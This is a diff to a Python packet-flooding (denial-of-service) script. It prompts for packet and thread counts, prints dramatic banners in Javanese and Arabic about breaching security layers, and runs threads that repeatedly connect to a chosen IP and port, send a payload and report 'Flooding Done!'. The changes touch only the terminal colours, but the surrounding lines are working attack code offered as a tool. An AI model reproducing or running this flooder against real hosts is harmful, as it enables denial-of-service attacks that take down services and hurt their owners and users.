@@ -61,14 +61,14 @@ packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
 print("\033[31m⁸⁹⁰⁰⁰⁰⁸")
 thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
 print("\033[94m⁸⁹⁰⁰⁰⁰⁸"),
-print("\033[92m..................>>> BIRUH BIDDAM NAFDIKA YAA AQSHA \033[0m "),
+print("\033[96m..................>>> BIRUH BIDDAM NAFDIKA YAA AQSHA \033[0m "),
 print("\033[92m..................>>> SIYAP-SIYAP GOLEK SERVER \033[0m "),
 time.sleep(2),
-print("\033[92m..................>>> MIWITI GOLEK SAMBUNGAN \033[0m "),
+print("\033[1m..................>>> MIWITI GOLEK SAMBUNGAN \033[0m "),
 time.sleep(2),
-print("\033[92m..................>>> NEMBUS LAPISAN KEAMANAN \033[0m "),
+print("\033[97m..................>>> NEMBUS LAPISAN KEAMANAN \033[0m "),
 time.sleep(2),
-print("\033[92m..................>>> DIGAWE SAMBUNGAN \033[0m "),
+print("\033[95m..................>>> DIGAWE SAMBUNGAN \033[0m "),
 time.sleep(2),
 
 
@@ -91,10 +91,10 @@ def start():
          s.connect((ip,port))
          s.send(r)
          u += 1
-         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN " +str(u)+ "    \033[1mZN33P3R 6453 " +str()+ "   \033[1m" +ip+ "\033[0m" )
+         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN " +str(u)+ "    \033[1mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
        finally:
          s.close()
-         print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
+         print("\033[33m[\033[1m-\033[33m]\033[92mFlooding Done!")
 
 for x in range(thread):
   thred = threading.Thread(target=start)
